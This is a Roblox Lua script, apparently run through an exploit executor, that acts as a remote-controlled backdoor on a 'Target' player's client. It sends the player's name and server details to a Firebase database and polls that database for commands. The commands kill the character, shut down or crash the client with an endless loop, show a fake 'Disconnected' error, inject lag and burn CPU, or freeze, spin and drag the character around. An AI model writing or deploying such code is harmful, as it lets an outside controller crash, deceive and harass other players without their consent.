local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local FIREBASE_URL = "https://troll-master67-default-rtdb.firebaseio.com/"
local MY_ROLE = "Target" 

-- === SISTEM PENGAMAN WAKTU ===
local SCRIPT_START_TIME = os.time() -- Mencatat detik tepat saat player baru join/eksekusi
local COMMAND_EXPIRY_TIME = 10     -- Perintah yang lebih lama dari 10 detik akan otomatis hangus

local lastCommandId = ""
local orbitConnection
local spasmConnection
local lagConnection

local function stopLoops()
    if orbitConnection then orbitConnection:Disconnect(); orbitConnection = nil end
    if spasmConnection then spasmConnection:Disconnect(); spasmConnection = nil end
    if lagConnection then lagConnection:Disconnect(); lagConnection = nil end
    pcall(function() settings().Network.IncomingReplicationLag = 0 end)
end

local function registerPlayer()
    local playerData = {
        name = LocalPlayer.Name,
        role = MY_ROLE,
        gameId = tostring(game.JobId),
        placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    }
    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        pcall(function()
            request({
                Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json",
                Method = "PUT",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(playerData)
            })
        end)
    end
end

Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then
        local request = (syn and syn.request) or (http and http.request) or http_request or request
        if request then
            request({Url = FIREBASE_URL .. "players/" .. LocalPlayer.Name .. ".json", Method = "DELETE"})
        end
    end
end)

local function executeCommand(cmdData)
    if not cmdData or cmdData.id == lastCommandId then return end
    
    -- VALIDASI TIMESTAMP / CEK WAKTU KETAT
    local cmdTimestamp = tonumber(cmdData.timestamp) or 0
    local currentTime = os.time()
    
    -- 1. Jika perintah dibuat sebelum player ini running skrip, TOLAK.
    if cmdTimestamp < SCRIPT_START_TIME then return end
    
    -- 2. Jika perintah sudah terlalu lama di database (kedaluwarsa), TOLAK.
    if (currentTime - cmdTimestamp) > COMMAND_EXPIRY_TIME then return end
    
    -- Jika lolos sensor waktu, tandai ID dan eksekusi
    lastCommandId = cmdData.id
    
    local command = cmdData.command
    local target = cmdData.target
    local extra = cmdData.message
    
    if target ~= "all" and target ~= LocalPlayer.Name then return end
    
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    
    stopLoops()
    
    if command == "walkspeed" then
        if hum and extra then
            local speed = tonumber(extra)
            if speed then hum.WalkSpeed = speed end
        end
        
    elseif command == "reset" then
        if hum then hum.Health = 0 end
        
    elseif command == "exit" then
        pcall(function() game:Shutdown() end)
        
    elseif command == "crash" then
        while true do local _ = Instance.new("Part", workspace) end
        
    elseif command == "fakedisconnect" then
        local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
        gui.IgnoreGuiInset = true
        local bg = Instance.new("Frame", gui)
        bg.Size = UDim2.new(1, 0, 1, 0)
        bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        bg.BackgroundTransparency = 0.4
        
        local p = Instance.new("Frame", bg)
        p.Size = UDim2.new(0, 380, 0, 220)
        p.Position = UDim2.new(0.5, -190, 0.5, -110)
        p.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
        
        local t = Instance.new("TextLabel", p)
        t.Size = UDim2.new(1, 0, 0, 40)
        t.Text = "Disconnected"
        t.TextColor3 = Color3.fromRGB(255, 255, 255)
        t.TextSize = 22
        t.Font = Enum.Font.SourceSansBold
        t.BackgroundTransparency = 1
        
        local r = Instance.new("TextLabel", p)
        r.Size = UDim2.new(1, -40, 0, 100)
        r.Position = UDim2.new(0, 20, 0, 50)
        r.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
        r.TextColor3 = Color3.fromRGB(200, 200, 200)
        r.TextSize = 16
        r.TextWrapped = true
        r.Font = Enum.Font.SourceSans
        r.BackgroundTransparency = 1
        
    elseif command == "replag" then
        pcall(function() settings().Network.IncomingReplicationLag = 10 end)
        
    elseif command == "fpsdrop" then
        lagConnection = RunService.Heartbeat:Connect(function()
            for i = 1, 3000000 do local _ = math.sin(i) * math.cos(i) end
        end)
        
    elseif command == "antiy" then
        if hum and root then
            hum.PlatformStand = false
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = true end
            end
            hum.WalkSpeed = 16 
            local bv = root:FindFirstChildOfClass("BodyVelocity") or root:FindFirstChildOfClass("BodyGyro")
            if bv then bv:Destroy() end
        end
        
    elseif command == "freeze" then
        if root then root.Anchored = true end
    elseif command == "unfreeze" then
        if root then root.Anchored = false end
    elseif command == "spasm" then
        if hum and root then
            hum.PlatformStand = true
            spasmConnection = RunService.Heartbeat:Connect(function()
                root.RotVelocity = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
            end)
        end
    elseif command == "unspasm" then
        if hum then hum.PlatformStand = false end
        if root then root.RotVelocity = Vector3.new(0,0,0) end
    elseif command == "orbit" then
        local orbitTarget = Players:FindFirstChild(extra)
        if root and orbitTarget and orbitTarget.Character and orbitTarget.Character:FindFirstChild("HumanoidRootPart") then
            local targetRoot = orbitTarget.Character.HumanoidRootPart
            local angle = 0
            orbitConnection = RunService.Heartbeat:Connect(function()
                if targetRoot and root then
                    angle = angle + 0.1
                    root.CFrame = targetRoot.CFrame * CFrame.Angles(0, angle, 0) * CFrame.new(0, 0, 10)
                else
                    stopLoops()
                end
            end)
        end
    end
end

registerPlayer()
task.spawn(function()
    while true do
        pcall(function()
            local response = game:HttpGet(FIREBASE_URL .. "command.json")
            if response and response ~= "null" then
                local data = HttpService:JSONDecode(response)
                executeCommand(data)
            end
        end)
        task.wait(1.5)
    end
end)

